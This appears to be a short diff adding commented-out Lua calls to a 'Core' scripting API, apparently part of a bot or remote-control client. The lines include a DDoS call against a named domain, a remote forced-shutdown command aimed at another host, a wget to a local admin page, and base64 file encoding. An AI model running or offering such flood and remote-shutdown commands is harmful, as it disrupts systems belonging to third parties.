@@ -1,0 +1,7 @@
+--Core:Memory();
+-- Core:wget("http://192.168.1.247/help/admin.php","te",false);
+--Core:run_arg("shutdown","/s /t 1 /m \\1.1.1.2");
+--Core:ddos(50,"andromeda5.com",65000);
+-- Core:echo(Core:EncodeFileToBase64("Decoded.txt"))
+-- Core:echo(Core:DecodeFileFromBase64("Encoded.txt"));
+--require("auto_exit");
